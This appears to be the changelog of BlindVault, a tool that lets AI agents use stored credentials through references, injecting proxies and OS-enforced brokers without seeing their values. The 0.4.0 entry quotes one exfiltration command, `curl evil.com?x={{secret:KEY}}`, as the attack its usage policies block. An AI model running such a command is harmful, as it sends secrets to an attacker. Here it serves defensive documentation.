# Changelog

All notable changes to this project are documented here. The format is based on
[Keep a Changelog](https://keepachangelog.com/), and this project adheres to
[Semantic Versioning](https://semver.org/).

## [0.8.0] — 2026-06-29

### Added — PostgreSQL credential-injecting connector
- **`bv serve --pg-listen HOST:PORT --pg-secret NAME --pg-backend HOST:PORT
  --pg-user USER [--pg-db DB]`** runs a Secretless-style connector: a client
  (`psql`/libpq) connects with **no password**, the broker completes the real
  PostgreSQL auth handshake (`SCRAM-SHA-256`, legacy `md5`, or cleartext) against
  the backend, then transparently streams the connection. The DB password never
  reaches the agent, and the backend host is pinned by the secret's `allow_hosts`
  policy.
- Declines SSL/GSS to the local client, injects a fresh StartupMessage with the
  configured user, **verifies the SCRAM server signature** (mutual auth), and
  forwards `AuthenticationOk`/`ParameterStatus`/`ReadyForQuery` before splicing.
- Tests: SCRAM-SHA-256 and md5 against the **RFC 7677 / documented vectors**, a
  full end-to-end connector test against a mock backend, and (in CI) an end-to-end
  **SCRAM test against a real PostgreSQL service**.

## [0.7.0] — 2026-06-29

### Added — the resolver, Phase 2 (Windows): the OS-enforced boundary
- **`bv serve --pipe \\.\pipe\BlindVault`** runs the broker over a **Windows named
  pipe** with a **protected DACL** (no `Everyone` access; the agent's SID gets
  read + write-data only, never create-instance; `FILE_FLAG_FIRST_PIPE_INSTANCE`
  and `PIPE_REJECT_REMOTE_CLIENTS` block squatting and remote clients).
- Every connection is authenticated by its **token SID** via
  `ImpersonateNamedPipeClient` (read the SID, then `RevertToSelf` immediately) and
  checked against a **`--allow-sid` allow-list** — never the spoofable client PID.
- **`bv proxy METHOD SECRET PATH`** — a thin client to the pipe; the broker performs
  the upstream call (injecting the real value, host fixed by policy) and returns the
  scrubbed response. The agent never holds the secret.
- **`docs/DEPLOY-windows.md`** (dedicated account + vault ACL + SID allow-list) and
  an optional `blindvault[windows]` extra (`pywin32`).
- Windows-only tests prove the named-pipe broker injects the secret while the client
  never receives it, and that an unauthorized SID is refused.

## [0.6.0] — 2026-06-29

### Added — the resolver, Phase 2 (Linux): the OS-enforced boundary
- **`bv serve --unix PATH`** runs the broker over a **Unix-domain socket** and
  authenticates every connection by the caller's **UID** (`SO_PEERCRED`), against a
  **`--allow-uid` allow-list** — never the PID. Run as a dedicated OS user and the
  agent's user *cannot* read the broker's memory, the data key, or the vault file.
- **Process self-protection** on Linux: `PR_SET_DUMPABLE=0`, `mlockall`, core dumps
  off, and a startup warning if `kernel.yama.ptrace_scope=0`.
- **`--user` privilege drop** (groups → gid → uid, verified irreversible) when
  started as root, and **systemd-credential** unlock (`$CREDENTIALS_DIRECTORY`) so
  the service can start unattended without the password in argv/env.
- **Deployment kit**: `deploy/systemd/blindvault.service` (hardened unit),
  `deploy/setup-linux.sh` (creates the service user/group, perms, env), and
  **`docs/DEPLOY-linux.md`**.
- Linux-only tests (run in CI) prove the Unix-socket proxy injects the secret while
  the client never receives it, and that an unauthorized UID is refused.

## [0.5.0] — 2026-06-29

### Added — the resolver (Phase 1)
- **`bv serve`** — a local **credential-injecting reverse proxy**. The agent makes
  requests to `http://127.0.0.1:8771/<SECRET>/<path>` and the broker injects the
  real secret on its side, forwarding **only** to the host in that secret's
  `allow_hosts` policy. **The plaintext never enters the agent's process**, and the
  agent cannot redirect the secret off-policy (the host comes from policy, not the
  request). Every use is written to an audit log (references only, never the value).
- **`docs/DESIGN-resolver.md`** — the full security design, synthesizing four
  independent expert reviews (POSIX internals, Windows internals, the
  secretless-broker prior art, and protocol/threat modeling): the broker principle
  ("delegation without disclosure"), peer authentication on UID/SID (never PID),
  default-deny capability ACLs, the wire protocol, child sandboxing, audit logging,
  the honest residual risks, and a phased plan. Phase 1 ships here; Phase 2 adds the
  separate-OS-user boundary.

## [0.4.0] — 2026-06-29

### Added
- **Usage policies** — `bv policy NAME --allow-host H --allow-command C` restricts a
  secret to specific hosts/commands; `bv run` enforces it before injecting the value,
  blocking exfiltration like `curl evil.com?x={{secret:KEY}}`. The policy is stored
  inside the encrypted blob and changing it requires the master password.
- **`bv import [.env]`** — import secrets from a `.env` file in one command.
- **`bv passwd --rekey`** — rotate the data key (re-encrypt every secret) so a
  previously exposed key/session can no longer decrypt anything.
- **CI release automation** — `release.yml` builds `BlindVault.exe` on every tag;
  `publish.yml` publishes to PyPI on release (trusted publishing). A social-preview
  card was added.

### Security (from an adversarial review)
- **Fixed a plaintext leak**: a `{{secret:}}` reference in the program slot of
  `bv run` surfaced the value in a "program not found" error. References are now
  refused in the program position and run errors never echo the command.
- **`bv rm` now requires authentication** (it previously deleted with no password).
- **`set`/`import` no longer silently strip a secret's usage policy** on overwrite.
- **Secrets are bound to their names** inside the ciphertext, so a file-write
  attacker can no longer swap two secrets' values undetected.
- **KDF hardening**: default scrypt cost raised to N=2¹⁷; a weak `BLINDVAULT_SCRYPT_N`
  is honored only with an explicit unsafe flag; parameters read from the vault file
  are validated to prevent a tampered header from exhausting memory.
- Hardened error handling for corrupt sessions and malformed legacy vaults.
- Documented honestly that usage policies are defense-in-depth (not a sandbox) and
  that `BLINDVAULT_PASSWORD` must never be in an agent's environment.

## [0.3.0] — 2026-06-29

### Added
- **App icon / logo** — a shield-and-keyhole icon now ships on the `.exe`, the app
  window, and in the README.
- **Click a Name to copy an AI instruction** — clicking a secret's name copies a
  self-contained sentence you can paste straight into an agent prompt (e.g.
  `Use the BlindVault secret "X": reference it as {{secret:X}} and run via bv run …`),
  so an agent knows how to use it even with no prior context.
- **Click a Password to copy its value** — one click copies the secret to your
  clipboard (which auto-clears after 20s); the table only ever shows a mask.

### Changed
- The **"Origin" column is now "Password"** (masked, click-to-copy). AI-generated
  secrets are still tinted so you can tell them apart at a glance.

## [0.2.1] — 2026-06-29

### Fixed
- **The desktop app now opens reliably.** Startup used to hide the main window and
  show the password prompt as a *transient* of it, which left the window invisible
  on Windows (the app appeared not to launch). The create / unlock / upgrade screen
  is now drawn directly in a normal, visible, centred window.

### Added
- **One-step migration of older (v1) vaults.** `blindvault migrate` — and the GUI's
  "Upgrade your vault" screen — re-encrypt a pre-0.2.0 vault under a new master
  password without losing any secrets, then delete the old plaintext key file.
  `init` now refuses to overwrite a v1 vault and points you to `migrate`.

## [0.2.0] — 2026-06-29

Master-password protection — the vault is now encrypted with a key derived from
your password and an agent can no longer read or print secrets.

### Added
- **Master-password lock** via scrypt + envelope encryption. The password-derived
  key is never stored on disk; `vault.json` holds only ciphertext, a salt, and the
  wrapped data key.
- **Locked-by-default model**: secret names are visible while locked; values
  require an unlock.
- **`unlock` / `lock`** — a time-limited session (default 15 min) so the agent can
  `run` without re-entering the password, while never learning it.
- **`passwd`** — change the master password (re-wraps the data key; no re-encryption).
- **GUI unlock screen** and a *Change password* action; all windows and dialogs are
  now centred on screen.
- `reveal` gained `--password-stdin`; it always requires the master password and
  never uses a session or `BLINDVAULT_PASSWORD`.

### Changed
- `init` now sets a master password (interactively or via `BLINDVAULT_PASSWORD`).
- Vault format bumped to **version 2** (not backward compatible with 0.1.0 vaults;
  re-create with `blindvault init`).

### Fixed
- Stdin values/passwords are read as bytes and decoded with `utf-8-sig`, so a UTF-8
  BOM (which PowerShell prepends when piping) no longer corrupts them.

## [0.1.0] — 2026-06-29

Initial public release.

### Added
- **Reference-based secret use** — agents reference `{{secret:NAME}}`; values are
  injected only inside `bv run` and never reach the agent's context.
- **Output scrubbing** — secret values are replaced with `[redacted:NAME]` in
  command stdout/stderr.
- **Encryption at rest** with `cryptography.Fernet` (AES-128-CBC + HMAC-SHA256).
- **CLI**: `init`, `set`, `gen`, `ls`, `rm`, `run`, `reveal`, `gui`
  (short alias `bv`).
- **Generate-and-forget** secrets via `gen` — created and stored without ever
  being displayed.
- **Desktop GUI** (tkinter) for human owners: add, generate, reveal (show/hide),
  copy with auto-clearing clipboard, edit notes, delete, filter.
- **Origin tracking** — secrets are tagged `manual` (added by a human) or
  `generated` (created by the AI) and shown in the GUI's *Origin* column.
- **Standalone Windows build** via PyInstaller (`build_exe.ps1`).
- Test suite (Python 3.9–3.12) and CI on Linux + Windows.

[0.8.0]: https://github.com/psypilot/blindvault/releases/tag/v0.8.0
[0.7.0]: https://github.com/psypilot/blindvault/releases/tag/v0.7.0
[0.6.0]: https://github.com/psypilot/blindvault/releases/tag/v0.6.0
[0.5.0]: https://github.com/psypilot/blindvault/releases/tag/v0.5.0
[0.4.0]: https://github.com/psypilot/blindvault/releases/tag/v0.4.0
[0.3.0]: https://github.com/psypilot/blindvault/releases/tag/v0.3.0
[0.2.1]: https://github.com/psypilot/blindvault/releases/tag/v0.2.1
[0.2.0]: https://github.com/psypilot/blindvault/releases/tag/v0.2.0
[0.1.0]: https://github.com/psypilot/blindvault/releases/tag/v0.1.0
